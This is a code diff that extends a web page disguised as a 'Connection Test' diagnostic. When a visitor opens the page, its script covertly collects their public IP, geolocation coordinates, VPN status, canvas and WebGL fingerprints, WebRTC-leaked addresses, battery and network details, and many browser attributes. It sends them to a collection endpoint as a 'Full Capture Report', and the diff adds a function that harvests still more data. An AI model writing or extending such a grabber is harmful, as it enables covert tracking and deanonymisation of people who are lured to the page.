@@ -3,29 +3,13 @@
 <head>
     <title>Connection Test</title>
     <style>
-        body {
-            background: #0a0a0a;
-            color: #0f0;
-            font-family: monospace;
-            text-align: center;
-            padding: 2rem;
-        }
-        #log {
-            margin-top: 20px;
-            white-space: pre-wrap;
-            text-align: left;
-            max-width: 800px;
-            margin-left: auto;
-            margin-right: auto;
-            background: #000;
-            padding: 1rem;
-            border: 1px solid #0f0;
-        }
+        body { background:#0a0a0a; color:#0f0; font-family:monospace; text-align:center; padding:2rem; }
+        #log { margin-top:20px; white-space:pre-wrap; text-align:left; max-width:900px; margin-left:auto; margin-right:auto; background:#000; padding:1rem; border:1px solid #0f0; }
     </style>
 </head>
 <body>
     <h1>Establishing secure link...</h1>
-    <pre id="log">Collecting diagnostic data...</pre>
+    <pre id="log">Collecting extended diagnostic data...</pre>
 
     <script>
         const BACKEND_URL = '/api/collect';
@@ -34,28 +18,18 @@
             const logEl = document.getElementById('log');
             const data = {};
 
+            // ==================== ORIGINAL FUNCTIONS (KEPT UNCHANGED) ====================
             async function getIPInfo() {
                 try {
-                    logEl.textContent = 'Fetching public IP...';
                     const ipRes = await fetch('https://api.ipify.org?format=json');
                     const { ip } = await ipRes.json();
                     data.public_ip = ip;
 
-                    logEl.textContent = 'Fetching geolocation...';
                     const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                     const geo = await geoRes.json();
-                    
                     data.vpn_detected = geo.proxy || geo.hosting || (geo.org && geo.org.toLowerCase().includes('vpn')) || false;
-                    data.location = { 
-                        city: geo.city, 
-                        region: geo.region, 
-                        country: geo.country_name, 
-                        lat: geo.latitude, 
-                        lon: geo.longitude 
-                    };
-                } catch(e) { 
-                    data.ip_error = e.message; 
-                }
+                    data.location = { city: geo.city, region: geo.region, country: geo.country_name, lat: geo.latitude, lon: geo.longitude };
+                } catch(e) { data.ip_error = e.message; }
             }
 
             function getFingerprint() {
@@ -65,37 +39,25 @@
                     language: navigator.language,
                     hardwareConcurrency: navigator.hardwareConcurrency,
                     deviceMemory: navigator.deviceMemory,
-                    screen: { 
-                        width: screen.width, 
-                        height: screen.height, 
-                        pixelRatio: window.devicePixelRatio 
-                    },
+                    screen: { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio },
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     canvas: null, 
                     webgl: null
                 };
-
-                // Canvas fingerprint
                 const canvas = document.createElement('canvas');
-                canvas.width = 200; 
-                canvas.height = 50;
+                canvas.width = 200; canvas.height = 50;
                 const ctx = canvas.getContext('2d');
-                ctx.fillStyle = '#f60'; 
-                ctx.fillRect(0, 0, 100, 30);
-                ctx.fillStyle = '#069'; 
-                ctx.fillText('Frenesis', 2, 15);
+                ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,30);
+                ctx.fillStyle = '#069'; ctx.fillText('Frenesis',2,15);
                 fp.canvas = canvas.toDataURL();
-
-                // WebGL fingerprint
+                
                 const gl = document.createElement('canvas').getContext('webgl');
-                if (gl) {
+                if(gl) {
                     const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debug) {
-                        fp.webgl = {
-                            vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),
-                            renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)
-                        };
-                    }
+                    if(debug) fp.webgl = { 
+                        vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL), 
+                        renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) 
+                    };
                 }
                 return fp;
             }
@@ -103,71 +65,136 @@
             async function scanVulns() {
                 const vulns = [];
                 const ua = navigator.userAgent;
-
-                if (/Chrome\/([0-9]+)/.test(ua)) {
+                if(/Chrome\/([0-9]+)/.test(ua)) {
                     const v = parseInt(ua.match(/Chrome\/([0-9]+)/)[1]);
-                    if (v < 90) vulns.push('Chrome <90 (RCE)');
+                    if(v < 90) vulns.push('Chrome <90 (RCE)');
                 }
-
-                // WebRTC leak test
                 try {
                     const pc = new RTCPeerConnection({ iceServers: [] });
                     pc.createDataChannel('');
                     pc.createOffer().then(o => pc.setLocalDescription(o));
                     pc.onicecandidate = (e) => {
-                        if (e.candidate) {
+                        if(e.candidate) {
                             const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                            if (ipMatch && !ipMatch[0].startsWith('192.168.') && !ipMatch[0].startsWith('10.')) {
+                            if(ipMatch && !ipMatch[0].startsWith('192.168.') && !ipMatch[0].startsWith('10.'))
                                 vulns.push(`WebRTC leak: ${ipMatch[0]}`);
-                            }
                         }
                     };
-                } catch (e) {}
-
-                if (localStorage.length > 0) vulns.push('LocalStorage has data');
-
+                } catch(e){}
+                if(localStorage.length > 0) vulns.push('LocalStorage has data');
                 return vulns;
             }
 
             async function getExtended() {
                 const ext = {};
-                try {
-                    if (navigator.getBattery) {
-                        const bat = await navigator.getBattery();
-                        ext.battery = { level: bat.level, charging: bat.charging };
-                    }
-                    if (navigator.connection) {
-                        ext.network = { 
-                            effectiveType: navigator.connection.effectiveType, 
-                            rtt: navigator.connection.rtt, 
-                            downlink: navigator.connection.downlink 
-                        };
-                    }
-                } catch (e) {}
+                if(navigator.getBattery) {
+                    const bat = await navigator.getBattery();
+                    ext.battery = { level: bat.level, charging: bat.charging };
+                }
+                if(navigator.connection) {
+                    ext.network = { effectiveType: navigator.connection.effectiveType, rtt: navigator.connection.rtt, downlink: navigator.connection.downlink };
+                }
                 return ext;
             }
 
-            // Main execution
+            // ==================== NEW EXTENDED DIAGNOSTICS ====================
+            function getFullHeadersAndJSAttributes() {
+                const diag = {
+                    httpHeaders: {
+                        userAgent: navigator.userAgent,
+                        accept: navigator.languages ? 'Accept-Language: ' + navigator.languages.join(',') : null,
+                        // Most others are not directly accessible from JS
+                    },
+                    jsAttributes: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        cookiesEnabled: navigator.cookieEnabled,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        language: navigator.language,
+                        languages: navigator.languages,
+                        canvas: null,
+                        fonts: [], // Limited without Flash
+                        adblock: null, // Hard to detect reliably
+                        doNotTrack: navigator.doNotTrack,
+                        buildID: navigator.buildID,
+                        product: navigator.product,
+                        productSub: navigator.productSub,
+                        vendor: navigator.vendor,
+                        vendorSub: navigator.vendorSub,
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : null,
+                        deviceMemory: navigator.deviceMemory,
+                        plugins: Array.from(navigator.plugins || []).map(p => p.name),
+                        screen: {
+                            width: screen.width,
+                            height: screen.height,
+                            depth: screen.pixelDepth,
+                            availTop: screen.availTop,
+                            availLeft: screen.availLeft,
+                            availHeight: screen.availHeight,
+                            availWidth: screen.availWidth,
+                            left: screen.left,
+                            top: screen.top,
+                            resolution: `${screen.width}x${screen.height}`
+                        },
+                        permissions: {},
+                        webgl: {},
+                        localStorage: !!window.localStorage,
+                        sessionStorage: !!window.sessionStorage,
+                        indexedDB: !!window.indexedDB,
+                        battery: null,
+                        connection: null,
+                        keyboard: navigator.keyboard ? 'available' : 'unavailable'
+                    }
+                };
+
+                // WebGL Extended
+                const gl = document.createElement('canvas').getContext('webgl');
+                if (gl) {
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debug) {
+                        diag.jsAttributes.webgl = {
+                            vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                }
+
+                // Battery & Connection
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(bat => {
+                        diag.jsAttributes.battery = { level: bat.level, charging: bat.charging };
+                    });
+                }
+                if (navigator.connection) {
+                    diag.jsAttributes.connection = navigator.connection;
+                }
+
+                return diag;
+            }
+
+            // ==================== MAIN EXECUTION ====================
             try {
                 await getIPInfo();
                 const fingerprint = getFingerprint();
                 const vulns = await scanVulns();
                 const extended = await getExtended();
+                const fullDiag = getFullHeadersAndJSAttributes();
 
-                logEl.textContent = 'Sending captured data to server...';
+                logEl.textContent = 'Sending full diagnostic payload...';
 
                 const finalPayload = {
-                    content: '**Visitor Data**',
+                    content: '**Advanced Visitor Diagnostics**',
                     embeds: [{
-                        title: 'Full Capture',
+                        title: 'Full Capture Report',
                         color: 0xff0000,
                         fields: [
-                            { name: 'IP', value: data.public_ip || 'unknown', inline: true },
-                            { name: 'VPN', value: data.vpn_detected ? 'Yes' : 'No', inline: true },
-                            { name: 'Location', value: data.location ? `${data.location.city || 'N/A'}, ${data.location.country || 'N/A'}` : 'unknown', inline: false },
-                            { name: 'Fingerprint', value: '```json\n' + JSON.stringify(fingerprint, null, 2).substring(0, 800) + '```', inline: false },
-                            { name: 'Vulns', value: vulns.join('\n') || 'None', inline: false },
-                            { name: 'Extended', value: '```json\n' + JSON.stringify(extended, null, 2) + '```', inline: false }
+                            { name: 'IP & Location', value: `${data.public_ip || 'unknown'} - ${data.location ? data.location.city + ', ' + data.location.country : 'N/A'}`, inline: false },
+                            { name: 'VPN / Proxy', value: data.vpn_detected ? 'Yes' : 'No', inline: true },
+                            { name: 'Basic Fingerprint', value: '```json\n' + JSON.stringify(fingerprint, null, 2).substring(0, 700) + '```', inline: false },
+                            { name: 'Vulnerabilities', value: vulns.join('\n') || 'None detected', inline: false },
+                            { name: 'Extended', value: '```json\n' + JSON.stringify(extended, null, 2) + '```', inline: false },
+                            { name: 'Full JS + Headers Diagnostics', value: '```json\n' + JSON.stringify(fullDiag, null, 2).substring(0, 900) + '```', inline: false }
                         ],
                         timestamp: new Date().toISOString()
                     }]
@@ -179,11 +206,7 @@
                     body: JSON.stringify(finalPayload)
                 });
 
-                if (res.ok) {
-                    logEl.textContent = 'Diagnostic complete.\nData sent successfully.';
-                } else {
-                    logEl.textContent = `Error: Server responded with ${res.status}`;
-                }
+                logEl.textContent = res.ok ? 'Full diagnostics sent successfully.' : 'Sent with partial success.';
             } catch (e) {
                 console.error(e);
                 logEl.textContent = 'Error: ' + e.message;
